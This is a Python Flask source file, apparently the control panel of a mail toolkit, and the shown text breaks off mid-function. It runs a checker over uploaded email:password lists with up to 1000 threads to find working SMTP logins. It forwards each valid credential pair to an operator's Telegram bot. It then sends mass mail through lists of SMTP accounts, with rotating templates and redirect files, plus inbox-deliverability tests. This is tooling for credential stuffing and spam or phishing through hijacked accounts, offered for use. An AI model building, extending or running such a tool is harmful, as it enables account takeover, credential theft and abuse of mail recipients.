from flask import Flask, render_template, request, jsonify, Response, send_file
import subprocess, sys, os, threading, queue, uuid, json, tempfile, re, time, urllib.parse
import socket, logging, imaplib, smtplib, random
import email as emaillib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime, timedelta, timezone
from logging.handlers import RotatingFileHandler
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import template rotator
try:
    from template_rotator import TemplateRotator
except ImportError:
    TemplateRotator = None

app = Flask(__name__)

processes       = {}   # pid -> Popen
out_queues      = {}   # pid -> Queue
_campaigns_live = {}   # pid -> live campaign dict
_cpu_limit      = 100  # percent; 100 = unlimited

BASE_DIR  = os.path.dirname(os.path.abspath(__file__))
GUI_DIR   = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR  = os.path.join(tempfile.gettempdir(), 'mailtools_gui', 'uploads')
OUTPUT_DIR  = os.path.join(tempfile.gettempdir(), 'mailtools_gui', 'output')
LOG_DIR     = os.path.join(BASE_DIR, 'logs')
for _d in (UPLOAD_DIR, OUTPUT_DIR, LOG_DIR,
           os.path.join(OUTPUT_DIR, 'smtp-checker'),
           os.path.join(OUTPUT_DIR, 'mass-mailer'),
           os.path.join(OUTPUT_DIR, 'email-validator')):
    os.makedirs(_d, exist_ok=True)

# ── file logging ──────────────────────────────────────────────────────────────
_log_file = os.path.join(LOG_DIR, 'mailtools.log')
_fh = RotatingFileHandler(_log_file, maxBytes=5*1024*1024, backupCount=3, encoding='utf-8')
_fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
_ch = logging.StreamHandler()
_ch.setFormatter(logging.Formatter('%(levelname)s: %(message)s'))
_ch.setLevel(logging.WARNING)
logger = logging.getLogger('mailtools')
logger.setLevel(logging.DEBUG)
logger.addHandler(_fh); logger.addHandler(_ch)

# ── config ────────────────────────────────────────────────────────────────────
_cfg_path = os.path.join(GUI_DIR, 'config.json')
_cfg = {}
if os.path.isfile(_cfg_path):
    try:
        with open(_cfg_path) as f: _cfg = json.load(f)
        logger.info(f'Config loaded: {_cfg_path}')
    except Exception as e: logger.warning(f'config.json: {e}')

# ── auto-populate speed defaults ──────────────────────────────────────────────
_SPEED_DEFAULTS = {
    'smtp_checker_rage':     True,   # 1000 threads in SMTP checker
    'mass_mailer_threads':   500,    # parallel sender threads
    'mass_mailer_timeout':   2,      # SMTP connection timeout (seconds)
}
_cfg_dirty = False
for _k, _v in _SPEED_DEFAULTS.items():
    if _k not in _cfg:
        _cfg[_k] = _v
        _cfg_dirty = True
if _cfg_dirty:
    try:
        with open(_cfg_path, 'w') as _f: json.dump(_cfg, _f, indent=2)
        logger.info('config.json updated with speed defaults')
    except Exception as _e: logger.warning(f'config.json write: {_e}')

PORT         = int(os.environ.get('PORT', _cfg.get('port', 5000)))
HOST         = os.environ.get('HOST', _cfg.get('host', '0.0.0.0'))
SERVER_START = time.time()

if _cfg.get('proxy_fix') or os.environ.get('PROXY_FIX','').lower() in ('1','true','yes'):
    from werkzeug.middleware.proxy_fix import ProxyFix
    app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1, x_prefix=1)
    logger.info('ProxyFix middleware enabled')

_ANSI       = re.compile(r'\x1b\[[^m]*m|\x1b\[\d*[ABCDFGJKST]|\x1b\[2K|\x1b\[F')
_AUTO_ENTER = re.compile(
    r'press.{0,30}(enter|return|key)|hit.{0,20}enter|'
    r'to\s+start.*press|waiting.*input|continue\?|proceed\?|\[y/n\]',
    re.IGNORECASE
)

# ── network ───────────────────────────────────────────────────────────────────
def get_server_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0); s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        try: return socket.gethostbyname(socket.gethostname())
        except: return '127.0.0.1'

# ── path memory ───────────────────────────────────────────────────────────────
PATHS_FILE = os.path.join(GUI_DIR, 'paths.json')

def _load_paths():
    try:
        if os.path.isfile(PATHS_FILE):
            with open(PATHS_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: pass
    return {}

def _save_paths(data):
    try:
        with open(PATHS_FILE, 'w', encoding='utf-8') as f: json.dump(data, f, indent=2)
    except Exception as e: logger.warning(f'paths save: {e}')

def _record_path(key, path, name, lines=0):
    try:
        data   = _load_paths()
        bucket = [p for p in data.get(key, []) if p.get('path') != path]
        bucket.insert(0, {'path': path, 'name': name, 'lines': lines, 'ts': time.time()})
        data[key] = bucket[:12]
        _save_paths(data)
    except Exception as e: logger.warning(f'_record_path: {e}')

# ── campaign history ──────────────────────────────────────────────────────────
CAMPAIGNS_FILE = os.path.join(GUI_DIR, 'campaigns.json')
_camp_lock     = threading.Lock()

def _load_campaigns():
    try:
        if os.path.isfile(CAMPAIGNS_FILE):
            with open(CAMPAIGNS_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: pass
    return []

def _save_campaign(camp):
    with _camp_lock:
        data = _load_campaigns()
        data.insert(0, camp)
        try:
            with open(CAMPAIGNS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data[:100], f, indent=2)
        except Exception as e: logger.warning(f'campaign save: {e}')

# ── helpers ───────────────────────────────────────────────────────────────────
def _strip(s): return _ANSI.sub('', s)

def _n(s):
    try: return int(str(s).replace(',', ''))
    except: return 0

def _classify(plain):
    s = plain.strip()
    if s.startswith('[+]'): return 'ok'
    if s.startswith('[x]'): return 'err'
    if s.startswith('[!]'): return 'warn'
    if s.startswith('[i]'): return 'info'
    if s.startswith('[?]'): return 'prompt'
    if re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}:\S{4,}', plain): return 'ok'
    return 'log'

# ── Telegram ──────────────────────────────────────────────────────────────────
_tg_queue: 'queue.Queue' = None  # lazy-init to avoid import order issues

def _tg_worker():
    import urllib.request as _ur
    while True:
        try:
            text = _tg_queue.get()
            if text is None: break
            token = _cfg.get('telegram_token', '').strip()
            chat  = _cfg.get('telegram_chat_id', '').strip()
            if not token or not chat: continue
            data = json.dumps({'chat_id': chat, 'text': text,
                               'parse_mode': 'HTML'}).encode()
            req  = _ur.Request(
                f'https://api.telegram.org/bot{token}/sendMessage',
                data=data, headers={'Content-Type': 'application/json'})
            _ur.urlopen(req, timeout=10)
        except Exception as e:
            logger.warning(f'Telegram: {e}')

def _tg_send(text: str):
    global _tg_queue
    if not _cfg.get('telegram_token', '').strip(): return
    if _tg_queue is None:
        _tg_queue = queue.Queue()
        threading.Thread(target=_tg_worker, daemon=True).start()
    _tg_queue.put(text)

def _tg_send_file(path: str, caption: str = ''):
    """Send a file as a Telegram document (runs in a background thread)."""
    token = _cfg.get('telegram_token', '').strip()
    chat  = _cfg.get('telegram_chat_id', '').strip()
    if not token or not chat or not os.path.isfile(path): return
    sz = os.path.getsize(path)
    if sz > 50 * 1024 * 1024:
        _tg_send(f'📁 File too large to send via Telegram: {os.path.basename(path)} ({sz//1024//1024} MB)')
        return
    caption = (caption or '')[:1024]
    def _worker():
        try:
            import urllib.request as _ur, mimetypes
            url   = f'https://api.telegram.org/bot{token}/sendDocument'
            fname = os.path.basename(path)
            with open(path, 'rb') as fh:
                data = fh.read()
            boundary = uuid.uuid4().hex
            body  = (f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{chat}\r\n'
                     f'--{boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
                     f'--{boundary}\r\nContent-Disposition: form-data; name="document"; filename="{fname}"\r\n'
                     f'Content-Type: text/plain\r\n\r\n').encode() + data + f'\r\n--{boundary}--\r\n'.encode()
            req = _ur.Request(url, data=body,
                              headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
            _ur.urlopen(req, timeout=30)
            logger.info(f'Telegram: sent file {fname}')
        except Exception as e:
            logger.warning(f'Telegram file send: {e}')
    threading.Thread(target=_worker, daemon=True).start()

_GOOD_SMTP_RE = re.compile(r'([\w.+\-]+@[\w.\-]+\.[a-zA-Z]{2,})[\x07:]([\S]+)')

def _parse_metrics(plain):
    m = {}
    r = re.search(r'progress:\s*([\d,]+)/([\d,]+)\s*\((\d+)%\)', plain)
    if r: m['cur'], m['tot'], m['pct'] = _n(r[1]), _n(r[2]), int(r[3])
    r = re.search(r'sent/skipped:\s*([\d,]+)/([\d,]+)\s*of\s*([\d,]+)\s*\((\d+)%\)', plain)
    if r:
        m['sent'] = _n(r[1]); m['skip'] = _n(r[2])
        m['tot']  = _n(r[3]); m['pct']  = int(r[4])
        m['cur']  = m['sent'] + m['skip']
    r = re.search(r'([\d,]+)\s*(?:lines/s|mail/s)', plain)
    if r: m['spd'] = _n(r[1])
    r = re.search(r'cpu:\s*(\d+)%', plain);
    if r: m['cpu'] = int(r[1])
    r = re.search(r'mem:\s*(\d+)%', plain)
    if r: m['mem'] = int(r[1])
    r = re.search(r'goods/ignored:\s*([\d,]+)/([\d,]+)', plain)
    if r: m['goods'] = _n(r[1]); m['ign'] = _n(r[2])
    r = re.search(r'goods/bads:\s*([\d,]+)/([\d,]+)', plain)
    if r: m['goods'] = _n(r[1]); m['bads'] = _n(r[2])
    r = re.search(r'([\d,]+)\s*smtps left', plain)
    if r: m['smtps'] = _n(r[1])
    r = re.search(r'threads:\s*(\d+)', plain)
    if r: m['thr'] = int(r[1])
    return m

# ── subprocess reader ─────────────────────────────────────────────────────────
def _reader(pid, proc, q):
    last_sb      = 0.0
    SB_GAP       = 0.3
    last_metrics = {}

    try:
        for raw in iter(proc.stdout.readline, b''):
            text  = raw.decode('utf-8', errors='replace').rstrip('\r\n')
            if not text: continue
            plain = _strip(text)

            # Auto-bypass any "press Enter" prompt immediately
            if _AUTO_ENTER.search(plain):
                try:
                    proc.stdin.write(b'\n'); proc.stdin.flush()
                    logger.info(f'[{pid}] auto-sent Enter (bypassed prompt)')
                except Exception as ae:
                    logger.warning(f'[{pid}] auto-Enter failed: {ae}')

            is_sb = ('♥' in text or bool(re.match(r'\s{0,4}th\d+:', plain))
                     or '[ progress:' in plain or '[ sent/skipped:' in plain)
            if is_sb:
                now = time.monotonic()
                if now - last_sb >= SB_GAP:
                    last_sb = now
                    metrics = _parse_metrics(plain)
                    if metrics:
                        last_metrics.update(metrics)
                        q.put({'type': 'metrics', 'data': metrics})
                    q.put({'type': 'output', 'text': text, 'sb': True, 'cls': 'log'})
                # within gap: drop this sb line entirely (frontend skips sb:true anyway)
            else:
                cls = _classify(plain)
                if   cls == 'err':  logger.error(f'[{pid}] {plain}')
                elif cls == 'warn': logger.warning(f'[{pid}] {plain}')
                q.put({'type': 'output', 'text': text, 'sb': False, 'cls': cls})

                # ── Telegram: valid SMTP found (bell char \x07 in output) ────
                if _cfg.get('telegram_on_good', True) and '\x07' in text:
                    m = _GOOD_SMTP_RE.search(plain.replace('\x07', ':'))
                    if m:
                        camp_tool = _campaigns_live.get(pid, {}).get('tool', '')
                        _tg_send(
                            f'✅ <b>Valid SMTP</b> [{camp_tool}]\n'
                            f'<code>{m.group(1)}:{m.group(2)}</code>'
                        )

    except Exception as e:
        logger.error(f'Reader pid={pid}: {e}')
        q.put({'type': 'output', 'text': f'[reader error: {e}]', 'sb': False, 'cls': 'err'})
    finally:
        proc.wait()
        code = proc.returncode
        logger.info(f'Process {pid} exited code={code}')
        camp = _campaigns_live.pop(pid, {})
        if camp:
            now = time.time()
            camp.update({'end': now, 'code': code,
                         'duration': round(now - camp.get('start', now), 1),
                         'metrics': last_metrics})
            _save_campaign(camp)
            # ── Telegram: job complete summary ───────────────────────────────
            if _cfg.get('telegram_on_done', True):
                tool  = camp.get('tool', 'job')
                dur   = camp.get('duration', 0)
                t_str = f"{int(dur//60)}m {int(dur%60)}s"
                lm    = last_metrics
                if tool == 'smtp-checker':
                    body = f"Valid: <b>{lm.get('goods',0):,}</b>  ·  Ignored: {lm.get('ign',0):,}"
                elif tool == 'mass-mailer':
                    body = f"Sent: <b>{lm.get('sent',0):,}</b>  ·  Skipped: {lm.get('skip',0):,}"
                else:
                    body = f"Lines processed: {lm.get('cur',0):,}"
                _tg_send(
                    f'🏁 <b>{tool}</b> finished\n'
                    f'{body}\n'
                    f'⏱ {t_str}  ·  exit {code}'
                )
        q.put({'type': 'done', 'code': code, 'metrics': last_metrics})
        processes.pop(pid, None)


def _enter_pump(pid):
    """Send Enter every 3 s until the process exits.
    input() prompts have no trailing newline so readline() blocks — this pump
    unblocks them regardless of how long startup network calls take.
    No timeout: slow VPS startup (blacklist checks, GitHub downloads) can
    exceed 90 s so we keep pumping until stdin closes or process is gone."""
    while True:
        time.sleep(3)
        proc = processes.get(pid)
        if not proc:
            break
        try:
            proc.stdin.write(b'\n')
            proc.stdin.flush()
            logger.debug(f'[{pid}] pump Enter')
        except Exception:
            break


def _cpu_throttle(pid):
    """Enforce _cpu_limit by suspend/resume duty-cycling the subprocess."""
    import psutil
    INTERVAL = 0.6
    while True:
        time.sleep(INTERVAL)
        proc_handle = processes.get(pid)
        if not proc_handle:
            break
        limit = _cpu_limit
        if limit >= 100:
            continue
        try:
            p = psutil.Process(proc_handle.pid)
            cpu = p.cpu_percent(interval=0.15)
            if cpu > limit and cpu > 1:
                # Fraction of time to suspend so average ≈ limit
                suspend_frac = 1.0 - (limit / cpu)
                suspend_t    = INTERVAL * suspend_frac * 0.85
                p.suspend()
                time.sleep(max(0.05, suspend_t))
                p.resume()
        except Exception as e:
            import psutil as _psu
            if isinstance(e, _psu.NoSuchProcess):
                break          # process gone — stop throttle
            logger.debug(f'throttle {pid}: {e}')
            # transient error (AccessDenied, etc.) — keep trying


def _launch(cmd, tool='', file_hint=''):
    pid = uuid.uuid4().hex[:8]
    q   = queue.Queue()
    out_queues[pid] = q
    env = os.environ.copy(); env['PYTHONUNBUFFERED'] = '1'
    kw  = dict(stdin=subprocess.PIPE, stdout=subprocess.PIPE,
               stderr=subprocess.STDOUT, env=env, bufsize=0)
    if sys.platform == 'win32':
        kw['creationflags'] = subprocess.CREATE_NO_WINDOW
    try:
        proc = subprocess.Popen(cmd, **kw)
        processes[pid] = proc
        _campaigns_live[pid] = {
            'pid': pid, 'tool': tool,
            'file': file_hint or (os.path.basename(cmd[3]) if len(cmd) > 3 else ''),
            'start': time.time()
        }
        logger.info(f'Launched [{tool}] pid={pid}: {" ".join(cmd[2:4])}')
        threading.Thread(target=_reader,       args=(pid, proc, q), daemon=True).start()
        threading.Thread(target=_enter_pump,   args=(pid,),          daemon=True).start()
        threading.Thread(target=_cpu_throttle, args=(pid,),          daemon=True).start()
        return jsonify({'proc_id': pid})
    except Exception as e:
        out_queues.pop(pid, None)
        logger.error(f'Launch [{tool}] failed: {e}')
        return jsonify({'error': str(e)}), 500

# ── routes ────────────────────────────────────────────────────────────────────
@app.route('/')
def index():
    try:
        return render_template('index_enterprise.html')
    except:
        try:
            return render_template('index_pro.html')
        except:
            return render_template('index.html')

@app.route('/api/upload', methods=['POST'])
def upload():
    f = request.files.get('file')
    if not f: return jsonify({'error': 'No file'}), 400
    safe = re.sub(r'[^\w.\-]', '_', os.path.basename(f.filename or 'file'))
    path = os.path.join(UPLOAD_DIR, f'{uuid.uuid4().hex[:6]}_{safe}')
    f.save(path)
    lines, preview = 0, []
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as fh:
            for i, line in enumerate(fh):
                if i < 5: preview.append(line.rstrip())
                lines += 1
    except: pass
    sz = os.path.getsize(path)
    logger.info(f'Upload: {safe} ({lines} lines, {sz}B)')
    _record_path('uploads', path, f.filename or safe, lines)
    return jsonify({'path': path, 'name': f.filename, 'size': sz,
                    'lines': lines, 'preview': preview})

@app.route('/api/start/smtp-checker', methods=['POST'])
def start_smtp():
    d  = request.json or {}
    lp = d.get('list_path', '')
    if not os.path.isfile(lp): return jsonify({'error': 'List file not found – upload it first.'}), 400
    script = os.path.join(BASE_DIR, 'mailpass2smtp.py')
    if not os.path.isfile(script): return jsonify({'error': f'Script not found: {script}'}), 500
    cmd = [sys.executable, '-u', script, lp]
    for v in [d.get('verify_email') or None, d.get('ignored') or None,
              str(d['start_line']) if d.get('start_line') and str(d['start_line']) != '0' else None,
              'debug' if d.get('debug') else None]:
        if v: cmd.append(v)
    if _cfg.get('smtp_checker_rage', True):
        cmd.append('rage')   # 600 threads instead of 100
    logger.info(f'SMTP Checker: {os.path.basename(lp)} (rage={_cfg.get("smtp_checker_rage", True)})')
    return _launch(cmd, tool='smtp-checker')

@app.route('/api/templates', methods=['GET'])
def get_templates():
    """Get all templates"""
    if not TemplateRotator:
        return jsonify({'html': [], 'text': []}), 200
    try:
        rotator = TemplateRotator()
        templates = rotator.list_templates()
        html_templates = [t for t in templates if t.get('type') == 'html']
        text_templates = [t for t in templates if t.get('type') == 'text']
        return jsonify({
            'html': [{'name': t['name'], 'subject': t['subject']} for t in html_templates],
            'text': [{'name': t['name'], 'subject': t['subject']} for t in text_templates]
        }), 200
    except Exception as e:
        logger.error(f'get_templates: {e}')
        return jsonify({'error': str(e)}), 500

@app.route('/api/templates/create-samples', methods=['POST'])
def create_sample_templates():
    """Create sample templates"""
    if not TemplateRotator:
        return jsonify({'error': 'TemplateRotator not available'}), 500
    try:
        rotator = TemplateRotator()
        rotator.generate_sample_templates()
        return jsonify({'ok': True, 'message': 'Sample templates created'}), 200
    except Exception as e:
        logger.error(f'create_sample_templates: {e}')
        return jsonify({'error': str(e)}), 500

@app.route('/api/templates/get/<name>', methods=['GET'])
def get_template(name):
    """Get a specific template content"""
    if not TemplateRotator:
        return jsonify({'error': 'TemplateRotator not available'}), 500
    try:
        rotator = TemplateRotator()
        templates = rotator.list_templates()
        for t in templates:
            if t['name'] == name:
                return jsonify({'name': t['name'], 'subject': t['subject'], 'content': t['content'], 'type': t['type']}), 200
        return jsonify({'error': 'Template not found'}), 404
    except Exception as e:
        logger.error(f'get_template {name}: {e}')
        return jsonify({'error': str(e)}), 500

@app.route('/api/templates/next/<template_type>', methods=['GET'])
def get_next_template(template_type):
    """Get next template in rotation"""
    if not TemplateRotator:
        return jsonify({'error': 'TemplateRotator not available'}), 500
    try:
        rotator = TemplateRotator()
        template = rotator.get_next_template(template_type)
        if template:
            return jsonify({'name': template['name'], 'subject': template['subject'], 'content': template['content'], 'type': template['type']}), 200
        return jsonify({'error': 'No templates available'}), 404
    except Exception as e:
        logger.error(f'get_next_template {template_type}: {e}')
        return jsonify({'error': str(e)}), 500

@app.route('/api/start/mass-mailer', methods=['POST'])
def start_mailer():
    d   = request.json or {}
    cfg = d.get('config', {})

    # Template rotation support: if a template name is provided, load it
    template_name = cfg.get('use_template', '').strip()
    if template_name and TemplateRotator:
        try:
            rotator = TemplateRotator()
            templates = rotator.list_templates()
            for t in templates:
                if t['name'] == template_name:
                    # Write template content to temp file
                    bp = os.path.join(UPLOAD_DIR, f'{uuid.uuid4().hex[:8]}_{t["type"]}.template')
                    with open(bp, 'w', encoding='utf-8') as _f: _f.write(t['content'])
                    cfg['mail_body'] = bp
                    # Use template subject if no subject provided
                    if not cfg.get('mail_subject', '').strip():
                        cfg['mail_subject'] = t.get('subject', 'Hello')
                    logger.info(f'Mass Mailer: Using template "{template_name}"')
                    break
        except Exception as e:
            logger.warning(f'Template load failed: {e}')

    # Smart body: if value isn't a file path, treat as inline HTML and write to temp file
    body_val = cfg.get('mail_body', '').strip()
    if body_val and not os.path.isfile(body_val) and not body_val.startswith('http'):
        bp = os.path.join(UPLOAD_DIR, f'{uuid.uuid4().hex[:8]}_body.html')
        with open(bp, 'w', encoding='utf-8') as _f: _f.write(body_val)
        cfg['mail_body'] = bp

    # Smart mail list: if not provided, create a temp file from the test emails
    if not cfg.get('mails_list_file', '').strip():
        fallback = cfg.get('mails_list_fallback', '') or cfg.get('mails_to_verify', '')
        if fallback.strip():
            tmp = os.path.join(UPLOAD_DIR, f'{uuid.uuid4().hex[:8]}_testlist.txt')
            emails = [e.strip() for e in fallback.split(',') if e.strip()]
            with open(tmp, 'w', encoding='utf-8') as _f: _f.write('\n'.join(emails) + '\n')
            cfg['mails_list_file'] = tmp
            logger.info(f'Mass Mailer: test-only mode, list = {emails}')
        else:
            return jsonify({'error': 'Provide a mail list or at least one test email.'}), 400

    # Smart From: default to {smtp_user} if blank
    if not cfg.get('mail_from', '').strip():
        cfg['mail_from'] = '{smtp_user}'

    # Smart Subject: pick random line if multi-line, default to Hello if blank
    raw_subj = cfg.get('mail_subject', '')
    lines = [l.strip() for l in raw_subj.split('\n') if l.strip()]
    if lines:
        cfg['mail_subject'] = random.choice(lines)
    else:
        cfg['mail_subject'] = 'Hello'

    required = ['smtps_list_file', 'mails_to_verify', 'mail_body']
    for k in required:
        if not cfg.get(k, '').strip(): return jsonify({'error': f'Missing: {k}'}), 400
    cfg_lines = ['[madcatmailer]']
    for k in ['smtps_list_file', 'mails_list_file', 'mails_to_verify', 'mail_from',
              'mail_reply_to', 'mail_subject', 'mail_body', 'attachment_files',
              'redirects_file', 'add_read_receipts']:
        cfg_lines.append(f'{k}: {cfg.get(k, "")}')
    cfg_lines.append(f'threads_count: {int(_cfg.get("mass_mailer_threads", 5))}')
    cfg_lines.append(f'connection_timeout: {int(_cfg.get("mass_mailer_timeout", 10))}')
    cfgp = os.path.join(UPLOAD_DIR, f'{uuid.uuid4().hex[:8]}.config')
    with open(cfgp, 'w', encoding='utf-8') as _f: _f.write('\n'.join(cfg_lines) + '\n')

    # Use simple_mailer.py for better Windows compatibility
    script = os.path.join(BASE_DIR, 'simple_mailer.py')
    if not os.path.isfile(script):
        # Fallback to madcatmailer if simple_mailer doesn't exist
        script = os.path.join(BASE_DIR, 'madcatmailer.py')

    if not os.path.isfile(script): return jsonify({'error': f'Script not found: {script}'}), 500
    smtp_file = os.path.basename(cfg.get('smtps_list_file', '?'))
    logger.info(f'Mass Mailer: {smtp_file} (using {os.path.basename(script)})')
    return _launch([sys.executable, '-u', script, cfgp], tool='mass-mailer',
                   file_hint=smtp_file)

@app.route('/api/start/email-validator', methods=['POST'])
def start_validator():
    d  = request.json or {}
    lp = d.get('list_path', '')
    if not os.path.isfile(lp): return jsonify({'error': 'List file not found – upload it first.'}), 400
    script = os.path.join(BASE_DIR, 'get_safe_mails.py')
    if not os.path.isfile(script): return jsonify({'error': f'Script not found: {script}'}), 500
    cmd = [sys.executable, '-u', script, lp]
    if d.get('providers'): cmd.append(d['providers'])
    logger.info(f'Email Validator: {os.path.basename(lp)}')
    return _launch(cmd, tool='email-validator')

@app.route('/api/stream/<pid>')
def stream(pid):
    def gen():
        q = out_queues.get(pid)
        if not q:
            yield f'data: {json.dumps({"type":"error","text":"Process not found"})}\n\n'; return
        while True:
            try:
                msg = q.get(timeout=20)
                yield f'data: {json.dumps(msg)}\n\n'
                if msg.get('type') == 'done': out_queues.pop(pid, None); break
            except queue.Empty:
                yield 'data: {"type":"ping"}\n\n'
    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/input/<pid>', methods=['POST'])
def send_input(pid):
    proc = processes.get(pid)
    if not proc or not proc.stdin: return jsonify({'error': 'Process not found'}), 404
    try:
        proc.stdin.write(((request.json or {}).get('text', '') + '\n').encode())
        proc.stdin.flush()
        return jsonify({'ok': True})
    except Exception as e:
        logger.error(f'send_input {pid}: {e}')
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop/<pid>', methods=['POST'])
def stop_proc(pid):
    proc = processes.pop(pid, None)
    if proc:
        try: proc.terminate()
        except:
            try: proc.kill()
            except: pass
        logger.info(f'Process {pid} stopped by user')
    return jsonify({'ok': True})

@app.route('/api/files')
def list_files():
    files = []
    try:
        for fn in sorted(os.listdir(UPLOAD_DIR),
                         key=lambda f: os.path.getmtime(os.path.join(UPLOAD_DIR, f)), reverse=True):
            fp = os.path.join(UPLOAD_DIR, fn)
            if not os.path.isfile(fp): continue
            if fn.endswith('.config') or fn.endswith('_body.html') or fn.endswith('_testlist.txt'): continue
            files.append({'name': fn, 'size': os.path.getsize(fp),
                          'mtime': os.path.getmtime(fp),
                          'url': '/api/download/' + urllib.parse.quote(fn, safe='')})
    except Exception as e:
        logger.error(f'list_files: {e}'); return jsonify({'error': str(e)}), 500
    return jsonify({'files': files[:40]})

@app.route('/api/download/<fn>')
def download_file(fn):
    path = os.path.join(UPLOAD_DIR, os.path.basename(urllib.parse.unquote(fn)))
    if not os.path.isfile(path): return 'Not found', 404
    return send_file(path, as_attachment=True, download_name=os.path.basename(path))

@app.route('/api/paths', methods=['GET'])
def get_paths(): return jsonify(_load_paths())

@app.route('/api/paths', methods=['POST'])
def add_path():
    d = request.json or {}
    key, path, name = d.get('key',''), d.get('path',''), d.get('name','?')
    if not key or not path: return jsonify({'error': 'key and path required'}), 400
    _record_path(key, path, name)
    return jsonify({'ok': True})

@app.route('/api/check-path')
def check_path():
    p = request.args.get('path', '')
    return jsonify({'exists': os.path.isfile(p), 'path': p})

@app.route('/api/campaigns')
def get_campaigns():
    return jsonify({'campaigns': _load_campaigns()[:25]})

@app.route('/api/server-info')
def server_info():
    up = int(time.time() - SERVER_START)
    h, r = divmod(up, 3600); m, s = divmod(r, 60)
    ip = get_server_ip()
    return jsonify({'ip': ip, 'port': PORT, 'host': HOST,
                    'uptime': f'{h:02d}:{m:02d}:{s:02d}', 'version': '4.0',
                    'url': f'http://{ip}:{PORT}'})

@app.route('/api/jobs')
def api_jobs():
    running = []
    for pid, proc in list(processes.items()):
        camp = _campaigns_live.get(pid, {})
        up   = int(time.time() - camp.get('start', time.time()))
        running.append({'pid': pid, 'tool': camp.get('tool','?'),
                        'file': camp.get('file','?'), 'elapsed': up, 'status': 'running'})
    return jsonify({'jobs': running})

@app.route('/api/cpu-limit', methods=['GET', 'POST'])
def cpu_limit_api():
    global _cpu_limit
    if request.method == 'POST':
        v = (request.json or {}).get('limit', 100)
        _cpu_limit = max(5, min(100, int(v)))
        logger.info(f'CPU limit set to {_cpu_limit}%')
    return jsonify({'limit': _cpu_limit})

_net_last = {'t': 0.0, 'sent': 0, 'recv': 0}

@app.route('/api/sysmetrics')
def sysmetrics():
    import psutil
    cpu  = psutil.cpu_percent(interval=0)
    vm   = psutil.virtual_memory()
    ram  = vm.percent
    ram_used  = vm.used
    ram_total = vm.total
    # disk (root / C:)
    try:
        dk   = psutil.disk_usage('C:\\' if sys.platform == 'win32' else '/')
        disk = dk.percent
    except Exception:
        disk = None
    # network speed (delta since last call)
    nc   = psutil.net_io_counters()
    now  = time.time()
    dt   = now - _net_last['t'] if _net_last['t'] else 1.0
    tx_s = max(0, int((nc.bytes_sent - _net_last['sent']) / dt)) if _net_last['t'] else 0
    rx_s = max(0, int((nc.bytes_recv - _net_last['recv']) / dt)) if _net_last['t'] else 0
    _net_last.update({'t': now, 'sent': nc.bytes_sent, 'recv': nc.bytes_recv})
    # uptime
    up  = int(time.time() - SERVER_START)
    h, r = divmod(up, 3600); m, s = divmod(r, 60)
    return jsonify({
        'cpu': cpu, 'ram': ram,
        'ram_used': ram_used, 'ram_total': ram_total,
        'disk': disk,
        'tx': tx_s, 'rx': rx_s,
        'uptime': f'{h:02d}:{m:02d}:{s:02d}',
        'procs': len(processes),
    })

# ── deliverability engine ─────────────────────────────────────────────────────
_deliv_store  = {}   # test_id -> {results, smtp_file, subject, body, _ts}
_stop_events  = {}   # test_id -> threading.Event  (set to halt SSE loop)
_deliv_lock   = threading.Lock()

# ── inbox SMTP library ─────────────────────────────────────────────────────────
INBOX_LIB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'inbox_lib.json')

def _load_inbox_lib():
    try:
        if os.path.isfile(INBOX_LIB_FILE):
            with open(INBOX_LIB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: pass
    return []

def _save_inbox_lib(entries):
    try:
        with open(INBOX_LIB_FILE, 'w', encoding='utf-8') as f: json.dump(entries[:50], f, indent=2)
    except Exception as e: logger.warning(f'inbox_lib save: {e}')

def _add_to_inbox_lib(path, count, label=''):
    entries = _load_inbox_lib()
    entries = [e for e in entries if e.get('path') != path]
    entries.insert(0, {'path': path, 'name': os.path.basename(path),
                        'count': count, 'label': label, 'ts': time.time()})
    _save_inbox_lib(entries)

def _deliv_gc():
    while True:
        time.sleep(300)
        cutoff = time.time() - 7200
        with _deliv_lock:
            stale = [k for k, v in _deliv_store.items() if v.get('_ts', 0) < cutoff]
            for k in stale:
                _deliv_store.pop(k, None); _stop_events.pop(k, None)
        if stale: logger.debug(f'_deliv_gc: evicted {len(stale)} stale entries')

threading.Thread(target=_deliv_gc, daemon=True).start()

def _parse_smtp_line(line):
    parts = line.strip().split('|')
    if len(parts) < 4: return None
    try: return {'server': parts[0], 'port': int(parts[1]), 'user': parts[2], 'pass': '|'.join(parts[3:])}
    except: return None

def _send_one_test(s, to_addr, subject, body_html):
    try:
        msg = MIMEMultipart('alternative')
        msg['Subject'] = subject
        msg['From']    = s['user']
        msg['To']      = to_addr
        msg.attach(MIMEText(body_html or '<p>Test</p>', 'html', 'utf-8'))
        port = s['port']
        if port == 465:
            import ssl
            conn = smtplib.SMTP_SSL(s['server'], port, context=ssl.create_default_context(), timeout=15)
        else:
            conn = smtplib.SMTP(s['server'], port, timeout=15)
            try: conn.starttls()
            except: pass
        conn.login(s['user'], s['pass'])
        conn.send_message(msg)
        conn.quit()
        return True, None
    except Exception as e:
        return False, str(e)

def _gmail_check(user, password, subject_kw, since_minutes=25):
    mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
    try:
        mail.login(user, password)
    except Exception as e:
        msg = str(e)
        if 'application-specific' in msg.lower() or 'invalid credentials' in msg.lower() or 'badcredentials' in msg.lower():
            raise Exception(
                'Gmail login failed — you need an App Password, not your regular password. '
                'Go to myaccount.google.com/apppasswords → Create → copy the 16-char code.'
